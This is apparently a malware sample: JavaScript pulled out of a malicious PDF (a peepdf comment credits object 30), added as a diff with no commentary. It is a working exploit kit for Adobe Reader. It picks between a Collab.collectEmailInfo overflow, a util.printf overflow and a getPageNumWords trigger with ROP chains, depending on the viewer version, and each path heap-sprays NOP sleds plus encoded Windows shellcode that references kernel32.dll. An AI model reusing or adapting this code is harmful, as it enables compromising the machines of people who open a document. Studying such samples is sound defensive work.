@@ -1,0 +1,137 @@
+// peepdf comment: Javascript code located in object 30 (version 0)
+
+function fix_it(yarsp, len) {
+    while (yarsp.length * 2 < len) {
+        yarsp += yarsp;
+    }
+    return yarsp.substring(0, len / 2);
+}
+
+function spray(str) {
+    roteDak = str.length * 2;
+    dakRote = unescape('%u9090');
+    spray = fix_it(dakRote, 0x2000 - roteDak);
+    loxWhee = str + spray;
+    loxWhee = fix_it(loxWhee, 524098);
+    var memory = new Array();
+    for (i = 0; i < 400; i++) {
+        memory[i] = loxWhee.substr(0, loxWhee.length - 1) + dakRote;
+    }
+}
+
+function _scode(linkx) {
+    var scodex = '%uc033%u72eb%ud233%u5655%uf633%ud285%u1175%u33fc%u64c0%u408b%u8b30%u0c40%u708b%uad1c%u508b%u5708%u428b%u8b3c%u0244%u0378%u50c2%u408b%u0320%u33c2%u41c9%u348b%u0388%u33f2%u50ff%uc033%ucfc1%uac13%uf803%uc085%u7558%u3bf2%u75fb%u58e6%u588b%u0324%u66da%u0c8b%u8b4b%u1c58%uc38b%uc203%u048b%u0388%u5fc2%u5d5e%ue0ff%ud233%u6a50%ubb40%u7a36%ud8eb%u8fe8%uffff%uc3ff%ud233%u5a52%uc283%u5204%uc033%u5250%ue3bb%ufb9c%ue843%uff78%uffff%uf633%uc63b%u0574%uf883%u75ff%u330d%ub4c0%uc110%u0ac0%u525a%ud03b%ud575%u525a%u3350%u56f6%u5656%ubb52%u6b81%u7d6e%u4de8%uffff%u58ff%ue850%uffa8%uffff%u5a5b%uc88b%u5152%u3353%u56f6%uc48b%u5056%u5153%ubb52%u674c%udc85%u2be8%uffff%u5bff%u595b%uf633%uc63b%u9774%uc18b%ucb8b%ud18b%u3880%u754d%u4015%u8049%u6138%u0e75%u4049%u3880%u7572%u4907%u8040%u5338%u0374%ue240%u33e3%u3bf6%u0fce%u6a84%uffff%u40ff%u5049%u8051%u0430%ue240%ub8fa%u0301%u0101%u012d%u0101%ue801%uff3e%uffff%ub850%ub701%u7e56%u012d%u0101%u5001%u2e68%u6c64%u686c%u6c65%u3233%u6b68%u7265%u8b6e%u33f4%u50c0%u5650%u9fbb%u03c4%ue8a8%ufeb0%uffff%u5a5a%u5a5a%ud08b%u5058%ubb50%u0301%u0101%ueb81%u0101%u0101%ubb53%u4179%u88e7%u93e8%ufffe%u5aff%uc203%u5248%u3350%u50c0%ubb52%ud294%u79e7%u7de8%ufffe%u58ff%ube5a%u545c%u504d%u3089%u4040%u4040%u70be%u6f72%u8976%u4030%u4040%ube40%u6469%u7265%u3089%u4040%u4040%u30be%u642e%u896c%u4030%u4040%ube40%u016d%u8a1e%uee81%u0101%u0101%u3089%u4040%u4040%uf28b%u3351%u50c0%u07bb%u0101%u8101%u01eb%u0101%u5301%u03bb%u0101%u8101%u01eb%u0101%u5301%u5050%u01bb%u0101%u8141%u01eb%u0101%u5301%ubb52%u7959%u4773%u07e8%ufffe%u5bff%u5a59%u5053%uff33%u8b57%u57dc%u5153%u5052%u4fbb%u6a47%ue807%ufdee%uffff%u5858%ubb50%uc877%uee01%ueb81%u0101%u0101%udbe8%ufffd%u5bff%u595a%u06b9%u0101%u8101%u01e9%u0101%u5101%uc033%u3350%u50c0%ubb56%uc49f%ua803%ubbe8%ufffd%u59ff%uebe2%ub84e%u01c9%u0101%u012d%u0101%u5001%ud233%u27bb%uce33%ue89a%ufda0%uffff%uc033%uf03b%ue275%uc033%u5048%u42bb%u9e09%ue85f%ufd8c%uffff';
+    return scodex;
+}
+
+function _funct(s) {
+    var i, f = s.length,
+        a = [];
+    for (i = 0; i < f; i++) {
+        a[i] = s.charCodeAt(i).toString(16);
+    }
+    var res = a.join("").toUpperCase();
+    var g = Math.round(res.length / 4);
+    if (g != (res.length / 4)) res = res + "00";
+    var out = "";
+    for (i = 0; i < res.length; i += 4) {
+        out = out + "%u" + res.substr(i + 2, 2) + res.substr(i, 2);
+    }
+    return out;
+}
+
+function heap_spray(ver, pg) {
+    if (ver == 9) {
+        var rop = '%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000';
+    }
+    if (ver == 8) {
+        var rop = '%u4141%u4141%u4141%u4141%u4141%u4141%u1705%u4a80%u50e0%u4a84%u630f%u4a80%ueba3%u4a80%u203c%u4a82%u57bc%u4a80%u107d%u4a80%u54e0%u4a82%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u1705%u4a80%u107d%u4a80%ufe83%u4a81%u1c01%u4a80%u0008%u0000%u597d%u4a80%ueba3%u4a80%u2038%u4a82%u57bc%u4a80%u107d%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u1705%u4a80%u107d%u4a80%ufe83%u4a81%u1c01%u4a80%u0008%u0000%u597d%u4a80%ueba3%u4a80%u2030%u4a82%u57bc%u4a80%u107d%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u1705%u4a80%u50e4%u4a84%u630f%u4a80%u1705%u4a80%u107d%u4a80%ufe83%u4a81%u1c01%u4a80%u0030%u0000%u597d%u4a80%ueba3%u4a80%u50e4%u4a84%u58af%u4a80%u1705%u4a80%u107d%u4a80%ufe83%u4a81%u1c01%u4a80%u0020%u0000%u597d%u4a80%u1705%u4a80%u107d%u4a80%u00a0%u4a82%ueba3%u4a80%u0034%u0000%u795a%u4a80%u1705%u4a80%u107d%u4a80%ufe83%u4a81%u1c01%u4a80%u000a%u0000%u597d%u4a80%ueba3%u4a80%u2140%u4a82%u57bc%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000';
+    }
+    var link = this.info.Author;
+    var scode = unescape(rop + _scode(link));
+    if (scode.length % 2) {
+        scode += unescape('%00');
+    }
+    scode = spray(scode);
+}
+
+var test = "asdkjansdjna jknasjkdn akjsnda jkndkjansdkj ";
+
+function collab_email() {
+    var link = this.info.coleml;
+    var sh = _scode(link);
+    var shellcode = unescape(sh);
+    var mem_array = new Array;
+    var cc = 0x0c0c0c0c;
+    var addr = 0x400000;
+    var sc_len = shellcode.length * 2;
+    var len = addr - (sc_len + 0x38);
+    var yarsp = unescape("%u9090%u9090");
+    yarsp = fix_it(yarsp, len);
+    var count2 = (cc - 0x400000) / addr;
+    for (var count = 0; count < count2; count++) {
+        mem_array[count] = yarsp + shellcode;
+    }
+    var overflow = unescape("%u0c0c%u0c0c");
+    while (overflow.length < 44952) {
+        overflow += overflow;
+    }
+    this.collabStore = Collab.collectEmailInfo({
+        subj: "",
+        msg: overflow
+    });
+}
+
+function util_printf() {
+    var payload = unescape("%uc033%u72eb%ud233%u5655%uf633%ud285%u1175%u33fc%u64c0%u408b%u8b30%u0c40%u708b%uad1c%u508b%u5708%u428b%u8b3c%u0244%u0378%u50c2%u408b%u0320%u33c2%u41c9%u348b%u0388%u33f2%u50ff%uc033%ucfc1%uac13%uf803%uc085%u7558%u3bf2%u75fb%u58e6%u588b%u0324%u66da%u0c8b%u8b4b%u1c58%uc38b%uc203%u048b%u0388%u5fc2%u5d5e%ue0ff%ud233%u6a50%ubb40%u7a36%ud8eb%u8fe8%uffff%uc3ff%ud233%u5a52%uc283%u5204%uc033%u5250%ue3bb%ufb9c%ue843%uff78%uffff%uf633%uc63b%u0574%uf883%u75ff%u330d%ub4c0%uc110%u0ac0%u525a%ud03b%ud575%u525a%u3350%u56f6%u5656%ubb52%u6b81%u7d6e%u4de8%uffff%u58ff%ue850%uffa8%uffff%u5a5b%uc88b%u5152%u3353%u56f6%uc48b%u5056%u5153%ubb52%u674c%udc85%u2be8%uffff%u5bff%u595b%uf633%uc63b%u9774%uc18b%ucb8b%ud18b%u3880%u754d%u4015%u8049%u6138%u0e75%u4049%u3880%u7572%u4907%u8040%u5338%u0374%ue240%u33e3%u3bf6%u0fce%u6a84%uffff%u40ff%u5049%u8051%u0430%ue240%ub8fa%u0301%u0101%u012d%u0101%ue801%uff3e%uffff%ub850%ub701%u7e56%u012d%u0101%u5001%u2e68%u6c64%u686c%u6c65%u3233%u6b68%u7265%u8b6e%u33f4%u50c0%u5650%u9fbb%u03c4%ue8a8%ufeb0%uffff%u5a5a%u5a5a%ud08b%u5058%ubb50%u0301%u0101%ueb81%u0101%u0101%ubb53%u4179%u88e7%u93e8%ufffe%u5aff%uc203%u5248%u3350%u50c0%ubb52%ud294%u79e7%u7de8%ufffe%u58ff%ube5a%u545c%u504d%u3089%u4040%u4040%u70be%u6f72%u8976%u4030%u4040%ube40%u6469%u7265%u3089%u4040%u4040%u30be%u642e%u896c%u4030%u4040%ube40%u016d%u8a1e%uee81%u0101%u0101%u3089%u4040%u4040%uf28b%u3351%u50c0%u07bb%u0101%u8101%u01eb%u0101%u5301%u03bb%u0101%u8101%u01eb%u0101%u5301%u5050%u01bb%u0101%u8141%u01eb%u0101%u5301%ubb52%u7959%u4773%u07e8%ufffe%u5bff%u5a59%u5053%uff33%u8b57%u57dc%u5153%u5052%u4fbb%u6a47%ue807%ufdee%uffff%u5858%ubb50%uc877%uee01%ueb81%u0101%u0101%udbe8%ufffd%u5bff%u595a%u06b9%u0101%u8101%u01e9%u0101%u5101%uc033%u3350%u50c0%ubb56%uc49f%ua803%ubbe8%ufffd%u59ff%uebe2%ub84e%u01c9%u0101%u012d%u0101%u5001%ud233%u27bb%uce33%ue89a%ufda0%uffff%uc033%uf03b%ue275%uc033%u5048%u42bb%u9e09%ue85f%ufd8c%uffff");
+    var nop = unescape("%u0A0A%u0A0A%u0A0A%u0A0A");
+    var heapblock = nop + payload;
+    var bigblock = unescape("%u0A0A%u0A0A");
+    var headersize = 20;
+    var spray = headersize + heapblock.length;
+    while (bigblock.length < spray) {
+        bigblock += bigblock;
+    }
+    var fillblock = bigblock.substring(0, spray);
+    var block = bigblock.substring(0, bigblock.length - spray);
+    while (block.length + spray < 0x40000) {
+        block = block + block + fillblock;
+    }
+    var mem_array = new Array();
+    for (var i = 0; i < 1400; i++) {
+        mem_array[i] = block + heapblock;
+    }
+    var num = 12999999999999999999888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888;
+    util.printf("%45000f", num);
+}
+
+
+function go_toxx(pg) {
+    var O_x = this.getPageNumWords(pg);
+}
+
+function check_ver() {
+    var version = app.viewerVersion.toString();
+    version = version.replace(/\D/g, "");
+    var ver_array = new Array(version.charAt(0), version.charAt(1), version.charAt(2));
+
+    if (ver_array[0] < 8) {
+        collab_email();
+        return 0;
+    }
+    if (ver_array[0] == 8) {
+        util_printf();
+        return 0;
+    }
+
+    if (ver_array[0] == 9) {
+        if (ver_array[1] < 4) {
+            heap_spray(ver_array[0]);
+            go_toxx(2);
+        }
+    }
+}
+
+var tesdst = "asdkjads sd sd s ds dsdnfdfdsf 43 r43 t5 gdsfs sdjna jknasjkdn akjsnda jkndkjansdkj ";
+check_ver();
+
